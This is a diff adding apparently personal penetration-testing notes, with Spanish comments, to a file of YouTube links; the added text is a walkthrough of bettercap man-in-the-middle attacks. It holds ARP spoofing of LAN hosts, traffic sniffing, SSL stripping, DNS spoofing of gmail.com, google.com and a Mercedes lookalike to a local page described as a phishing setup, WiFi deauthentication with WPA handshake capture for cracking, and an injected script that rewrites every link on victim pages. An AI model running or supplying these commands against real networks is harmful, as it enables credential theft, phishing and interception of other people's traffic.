@@ -39,6 +39,101 @@ https://www.youtube.com/watch?v=Jg8bF_CnSAU
 
 https://www.youtube.com/watch?v=sDTy32H9Hww&pp=ygUJI2FycHNwb29m
 
+```bash
+help
+net.probe on
+net.show
+set arp.spoof.targets 192.168.1.58
+arp.spoof on
+net.sniff on
+net.sniff off
+clear
+set dns.spoof.domains myamazon.com
+dns.spoof on
+help http.proxy
+set http.proxy.injectjs ./java-script.js  
+http.proxy on
+```
+
+```javascript
+window.onload = function(){
+    console.log("Hacked website");
+    anchors = document.getElementsByTagName("a");
+    for (var i = 0; i < anchors.length; i++){
+        anchors[i].href = "https://www.hackthissite.org";
+    }
+}
+```
+
+```bash
+http.proxy on
+caplets.show
+net.probe on
+help arp.spoof
+set arp.spoof.internal true
+set arp.spoof.targets 192.168.94.128
+arp.spoof on
+set net.sniff.output /home/esotericwarfare/pentest.pcap
+set net.sniff.verbose true
+net.sniff on
+set https.proxy.sslstrip true
+sudo wireshark /home/esotericwarfare/pentest.pcap
+Buscar por http
+Botón derecho - Follow - HTTP Stream
+help dns.spoof
+ping victim_website.com
+set dns.spoof.address ip_victim_website.com
+set dns.spoof.domains gmail.com,www.gmail.com,https://gmail.com
+dns.spoof on
+dns.spoof off
+set dns.spoof.domains google.com,www.google.com,https://google.com/gmail/about/
+dns.spoof on
+set dns.spoof.address 192.168.94.133
+dns.spoof off
+dns.spoof on
+set dns.spoof.all true
+set dns.spoof.domains testphp.vulnweb.com/login.php,testphp.vulnweb.com,vulnweb.com
+dns.spoof on
+set wifi.recon.channel 3
+set net.sniff.verbose true
+set net.sniff.output wpa.pcap
+net.sniff on
+wifi.show
+wifi.deauth bbsid
+exit
+Abrí la captura wpa.pcap con wireshark
+y podés romper el cifrado con aircrack o wpa auditor
+help arp.spoof
+arp.spoof on
+set arp.spoof.fullduplex true
+arp -a 
+set arp.spoof.targets 192.168.73.134
+arp.spoof on
+ahora volvé a ejecutar arp -a y verás ips cambiadas
+---
+
+net.probe on
+net.show
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.223.18
+arp.spoof on
+net.sniff on
+---
+net.probe on
+set arp.spoof.targets 10.0.0.3 10.0.0.1
+arp.spoof on
+net.sniff on
+net.sniff off
+clear
+sudo service apache2 start
+set dns.spoof.domains merdeces.com
+dns.spoof on
+Ahora mercedes.com redirige a una pagina local, así podemos hacer un ataque de phishing 
+---
+caplets.update
+https://hstspreload.org
+```
+
 https://www.youtube.com/watch?v=iU1jwD8mwZk
 
 https://www.youtube.com/watch?v=I0DVb8Op248&pp=ygUNI25pZmZwYXNzd29yZA%3D%3D
